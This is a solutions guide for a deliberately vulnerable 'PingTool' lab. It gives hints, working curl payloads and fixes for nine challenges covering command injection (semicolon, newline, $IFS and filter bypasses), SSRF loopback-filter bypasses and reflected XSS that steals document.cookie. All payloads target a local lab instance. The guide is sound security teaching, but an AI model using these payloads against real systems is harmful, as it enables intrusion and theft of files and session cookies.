# PingTool - Vulnerability Walkthrough & Solutions

This guide provides hints, reproducible `curl` commands, and remediation strategies for all 9 challenges in **PingTool** (`apps/ping-tool`).

---

## Part 1: OS Command Injection (`ping-tool-rce`)

### 1. PingTool - Unsanitized Command Injection (Easy)
- **Challenge ID**: `ping-tool-rce-easy`
- **Points**: 100
- **OWASP**: `A03:2021-Injection`

#### Progressive Hints
1. **Hint 1**: The application executes `ping -c <count> <host>` via Python's `subprocess.Popen(..., shell=True)`.
2. **Hint 2**: In shell syntax, semicolons `;` terminate the current command and permit executing an arbitrary secondary command.
3. **Hint 3**: Flags are stored inside `/app/flags/flag_rce.txt` (or `/app/flags/flag_rce_easy.txt`).

<details>
<summary>Solution</summary>

Execute the following `curl` command to chain `cat /app/flags/flag_rce.txt`:

```bash
curl -s -X POST http://127.0.0.1:8005/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; cat /app/flags/flag_rce.txt", "count": "1"}'
```

The response output will include the ICMP ping statistics followed immediately by the flag:
```json
{
  "command": "ping -c 1 127.0.0.1; cat /app/flags/flag_rce.txt",
  "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n...\nVULNLAB{...}\n",
  "success": true
}
```
</details>

---

### 2. PingTool - Filter-Bypass Command Injection (Medium)
- **Challenge ID**: `ping-tool-rce-medium`
- **Points**: 200
- **OWASP**: `A03:2021-Injection`

#### Progressive Hints
1. **Hint 1**: The server checks user input against a blacklist: `[';', '&&', '|']`.
2. **Hint 2**: Shell interpreters (such as `/bin/sh` and `/bin/bash`) accept newline characters (`\n` or `%0a` in URL encoding) as command terminators.
3. **Hint 3**: Alternatively, backticks (`` `...` ``) or command substitution `$()` execute subcommands before passing arguments to ping.

<details>
<summary>Solution</summary>

Switch difficulty to `medium` (or pass session cookie), then inject a newline character `\n`:

```bash
# Switch difficulty to medium
curl -s -X POST http://127.0.0.1:8005/api/set-difficulty \
  -H "Content-Type: application/json" \
  -d '{"difficulty": "medium"}'

# Execute newline command injection
curl -s -X POST http://127.0.0.1:8005/api/ping \
  -H "Content-Type: application/json" \
  --cookie "difficulty=medium" \
  -d '{"host": "127.0.0.1\ncat /app/flags/flag_rce.txt", "count": "1"}'
```

Alternative using command substitution:
```bash
curl -s -X POST http://127.0.0.1:8005/api/ping \
  -H "Content-Type: application/json" \
  --cookie "difficulty=medium" \
  -d '{"host": "$(cat /app/flags/flag_rce.txt)", "count": "1"}'
```
</details>

---

### 3. PingTool - Whitespace/Binary Bypass Command Injection (Hard)
- **Challenge ID**: `ping-tool-rce-hard`
- **Points**: 300
- **OWASP**: `A03:2021-Injection`

#### Progressive Hints
1. **Hint 1**: The server filters out `;`, `&`, `|`, and literal space characters ` `, while blocking binaries matching `\b(cat|sh|bash)\b`.
2. **Hint 2**: In POSIX shells, `$IFS` (Internal Field Separator) or `${IFS}` expands to whitespace and can replace standard spaces.
3. **Hint 3**: Instead of `cat`, alternative utilities can read files: `head`, `tail`, `more`, `nl`, `base64`, or shell redirection `<`.

<details>
<summary>Solution</summary>

Switch difficulty to `hard`, then use `\n` to terminate the ping command, `head` (or `nl`) instead of `cat`, and `$IFS` in place of spaces:

```bash
# Switch difficulty to hard
curl -s -X POST http://127.0.0.1:8005/api/set-difficulty \
  -H "Content-Type: application/json" \
  -d '{"difficulty": "hard"}'

# Exploit using newline + head + $IFS
curl -s -X POST http://127.0.0.1:8005/api/ping \
  -H "Content-Type: application/json" \
  --cookie "difficulty=hard" \
  -d '{"host": "127.0.0.1\nhead$IFS/app/flags/flag_rce.txt", "count": "1"}'
```

Alternative using input redirection:
```bash
curl -s -X POST http://127.0.0.1:8005/api/ping \
  -H "Content-Type: application/json" \
  --cookie "difficulty=hard" \
  -d '{"host": "127.0.0.1\n<${IFS}/app/flags/flag_rce.txt", "count": "1"}'
```
</details>

---

## Part 2: Server-Side Request Forgery (`ping-tool-ssrf`)

### 4. PingTool - Unrestricted SSRF (Easy)
- **Challenge ID**: `ping-tool-ssrf-easy`
- **Points**: 100
- **OWASP**: `A10:2021-Server-Side Request Forgery`

#### Progressive Hints
1. **Hint 1**: The HTTP Health / URL preview tool (`/api/ssrf`) performs HTTP requests on behalf of the server.
2. **Hint 2**: An internal diagnostic control plane is accessible at `http://127.0.0.1:8005/internal/status`, restricted to loopback callers.
3. **Hint 3**: In Easy mode, no URL validation or IP filtering is applied.

<details>
<summary>Solution</summary>

```bash
curl -s -X POST http://127.0.0.1:8005/api/ssrf \
  -H "Content-Type: application/json" \
  --cookie "difficulty=easy" \
  -d '{"url": "http://127.0.0.1:8005/internal/status"}'
```

The response returns the JSON output of `/internal/status` containing `FLAG_PING_TOOL_SSRF_EASY`:
```json
{
  "active_difficulty": "easy",
  "flag": "VULNLAB{...}",
  "service": "core-diagnostic-control-plane",
  "status": "operational"
}
```
</details>

---

### 5. PingTool - SSRF Localhost Filter Bypass (Medium)
- **Challenge ID**: `ping-tool-ssrf-medium`
- **Points**: 200
- **OWASP**: `A10:2021-Server-Side Request Forgery`

#### Progressive Hints
1. **Hint 1**: The server checks if `localhost` or `127.0.0.1` is in the target URL string.
2. **Hint 2**: Operating systems and HTTP client libraries support alternate representations of the loopback interface.
3. **Hint 3**: Try `0.0.0.0`, truncated IP `127.1`, decimal notation `2130706433`, hex `0x7f000001`, or IPv6 `[::]`.

<details>
<summary>Solution</summary>

Switch difficulty to `medium`, then target `0.0.0.0:8005` or `127.1:8005`:

```bash
# Set difficulty to medium
curl -s -X POST http://127.0.0.1:8005/api/set-difficulty \
  -H "Content-Type: application/json" \
  -d '{"difficulty": "medium"}'

# Bypass via 0.0.0.0
curl -s -X POST http://127.0.0.1:8005/api/ssrf \
  -H "Content-Type: application/json" \
  --cookie "difficulty=medium" \
  -d '{"url": "http://0.0.0.0:8005/internal/status"}'
```

Alternative using truncated octet IP notation:
```bash
curl -s -X POST http://127.0.0.1:8005/api/ssrf \
  -H "Content-Type: application/json" \
  --cookie "difficulty=medium" \
  -d '{"url": "http://127.1:8005/internal/status"}'
```
</details>

---

### 6. PingTool - SSRF CIDR/Hex/Redirect Bypass (Hard)
- **Challenge ID**: `ping-tool-ssrf-hard`
- **Points**: 300
- **OWASP**: `A10:2021-Server-Side Request Forgery`

#### Progressive Hints
1. **Hint 1**: In Hard mode, the server resolves the target hostname and checks whether the resulting IP is in `127.0.0.1/32` or `0.0.0.0/32`.
2. **Hint 2**: The entire IPv4 `127.0.0.0/8` block is reserved for loopback on Linux. Any IP like `127.0.0.2` binds locally but bypasses `/32` CIDR rules!
3. **Hint 3**: Furthermore, `requests.get()` follows HTTP 302 redirects by default (`allow_redirects=True`). The built-in redirector `/api/redirect?url=...` bypasses initial host resolution checks.

<details>
<summary>Solution</summary>

Switch difficulty to `hard`, then use alternative loopback address `127.0.0.2` or the HTTP redirect bypass:

**Approach A: CIDR Subnet Bypass (`127.0.0.2`)**
```bash
# Set difficulty to hard
curl -s -X POST http://127.0.0.1:8005/api/set-difficulty \
  -H "Content-Type: application/json" \
  -d '{"difficulty": "hard"}'

# Exploit loopback CIDR omission
curl -s -X POST http://127.0.0.1:8005/api/ssrf \
  -H "Content-Type: application/json" \
  --cookie "difficulty=hard" \
  -d '{"url": "http://127.0.0.2:8005/internal/status"}'
```

**Approach B: HTTP 302 Redirect Bypass**
```bash
curl -s -X POST http://127.0.0.1:8005/api/ssrf \
  -H "Content-Type: application/json" \
  --cookie "difficulty=hard" \
  -d '{"url": "http://127.0.0.2:8005/api/redirect?url=http://127.0.0.1:8005/internal/status"}'
```
</details>

---

## Part 3: Reflected Cross-Site Scripting (`ping-tool-xss`)

### 7. PingTool - Reflected XSS (Easy)
- **Challenge ID**: `ping-tool-xss-easy`
- **Points**: 100
- **OWASP**: `A03:2021-Injection`

#### Progressive Hints
1. **Hint 1**: The Host / DNS Inspector reflects failed queries directly into an error message using `{{ error_reflection | safe }}`.
2. **Hint 2**: Submitting `<script>alert(1)</script>` triggers arbitrary JavaScript in the user's browser.
3. **Hint 3**: To obtain the flag programmatically, submit the URL to the Admin Bot (`/api/report?url=...`) or inspect the administrative audit log (`/api/audit/logs`).

<details>
<summary>Solution</summary>

Submit the payload to the simulated Admin Bot:

```bash
curl -s -X POST http://127.0.0.1:8005/api/report \
  -H "Content-Type: application/json" \
  --cookie "difficulty=easy" \
  -d '{"url": "http://127.0.0.1:8005/lookup?host=%3Cscript%3Ealert(document.cookie)%3C/script%3E"}'
```

Or query the administrative audit endpoint directly:
```bash
curl -s "http://127.0.0.1:8005/api/audit/logs?search=%3Cscript%3Ealert(1)%3C/script%3E" \
  --cookie "difficulty=easy"
```
</details>

---

### 8. PingTool - Reflected XSS Tag Filter Bypass (Medium)
- **Challenge ID**: `ping-tool-xss-medium`
- **Points**: 200
- **OWASP**: `A03:2021-Injection`

#### Progressive Hints
1. **Hint 1**: The server strips `<script>` using a single-pass or case-sensitive match.
2. **Hint 2**: Uppercase tags (`<SCRIPT>`) bypass case-sensitive replacements.
3. **Hint 3**: Alternative HTML tags with inline event handlers like `<img src=x onerror=...>` or `<svg onload=...>` do not contain the string `<script>` at all.

<details>
<summary>Solution</summary>

Switch difficulty to `medium`, then submit an event-driven payload:

```bash
# Set difficulty to medium
curl -s -X POST http://127.0.0.1:8005/api/set-difficulty \
  -H "Content-Type: application/json" \
  -d '{"difficulty": "medium"}'

# Exploit with <img onerror=...>
curl -s -X POST http://127.0.0.1:8005/api/report \
  -H "Content-Type: application/json" \
  --cookie "difficulty=medium" \
  -d '{"url": "http://127.0.0.1:8005/lookup?host=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"}'
```

Alternative with uppercase `<SCRIPT>`:
```bash
curl -s -X POST http://127.0.0.1:8005/api/report \
  -H "Content-Type: application/json" \
  --cookie "difficulty=medium" \
  -d '{"url": "http://127.0.0.1:8005/lookup?host=%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E"}'
```
</details>

---

### 9. PingTool - Context-Breaking Reflected XSS (Hard)
- **Challenge ID**: `ping-tool-xss-hard`
- **Points**: 300
- **OWASP**: `A03:2021-Injection`

#### Progressive Hints
1. **Hint 1**: Angle brackets `<` and `>` are escaped into `&lt;` and `&gt;`, preventing the creation of new HTML tags.
2. **Hint 2**: Inspect the page source: user input is reflected inside an inline JavaScript string literal:
   ```html
   <script>
       let lastQueriedHost = "{{ host }}";
   </script>
   ```
3. **Hint 3**: Breaking out of the JavaScript string boundary does not require `<` or `>`. Use `"; alert(1); //`.

<details>
<summary>Solution</summary>

Switch difficulty to `hard`, then break out of the string literal using `"; alert(1); //`:

```bash
# Set difficulty to hard
curl -s -X POST http://127.0.0.1:8005/api/set-difficulty \
  -H "Content-Type: application/json" \
  -d '{"difficulty": "hard"}'

# Submit JavaScript context breakout to Admin Bot
curl -s -X POST http://127.0.0.1:8005/api/report \
  -H "Content-Type: application/json" \
  --cookie "difficulty=hard" \
  -d '{"url": "http://127.0.0.1:8005/lookup?host=%22;alert(document.cookie);//"}'
```

Or query `/api/audit/logs`:
```bash
curl -s "http://127.0.0.1:8005/api/audit/logs?search=%22;alert(1);//" \
  --cookie "difficulty=hard"
```
</details>

---

## Remediation & How to Fix

### 1. Remediating Command Injection
- **Avoid Shell Execution**: Never execute system commands with `shell=True` or string interpolation.
- **Pass Arguments as a List**:
  ```python
  # Safe implementation
  subprocess.run(['ping', '-c', '2', host], shell=False, check=True)
  ```
- **Strict Hostname Validation**:
  ```python
  import ipaddress
  try:
      ipaddress.ip_address(host)
  except ValueError:
      if not re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', host):
          raise ValueError("Invalid host")
  ```

### 2. Remediating SSRF
- **Comprehensive IP Blacklisting**: Check against all private, loopback, and link-local ranges:
  ```python
  ip = ipaddress.ip_address(resolved_ip)
  if ip.is_loopback or ip.is_private or ip.is_link_local or ip.is_reserved:
      raise PermissionError("Restricted IP destination")
  ```
- **Disable Automatic Redirects**:
  ```python
  requests.get(url, allow_redirects=False)
  ```
  If redirects are followed, re-validate each target IP before subsequent requests.
- **Enforce Host Whitelisting**: Restrict outbound requests to an explicit list of pre-approved domains.

### 3. Remediating Cross-Site Scripting
- **Context-Aware Encoding**:
  - Remove Jinja2 `| safe` filters when echoing untrusted user input into HTML bodies.
  - When embedding user input into inline JavaScript variables, use `tojson` rather than raw quotes:
    ```html
    <script>
        const host = {{ host | tojson }};
    </script>
    ```
- **Content Security Policy (CSP)**: Deploy a strict CSP header disallowing `unsafe-inline` script execution.
